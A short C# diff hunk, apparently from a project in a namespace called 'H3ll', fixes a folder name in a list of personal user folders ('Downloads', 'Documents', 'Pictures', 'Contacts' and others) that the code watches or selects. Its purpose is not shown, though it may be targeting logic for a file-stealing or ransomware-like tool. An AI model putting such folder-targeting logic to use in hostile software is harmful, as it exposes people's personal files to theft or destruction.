@@ -36,7 +36,7 @@ namespace H3ll
 
             for (int i = 0; i < directories.Length; i++)
             {
-                string[] watchedFolders = { "Download", "Desktop", "Favorites", "Documents", "OneDrive", "Pictures", "Contacts" };
+                string[] watchedFolders = { "Downloads", "Desktop", "Favorites", "Documents", "OneDrive", "Pictures", "Contacts" };
 
                 if (watchedFolders.Any(directories[i].Contains))
                 {
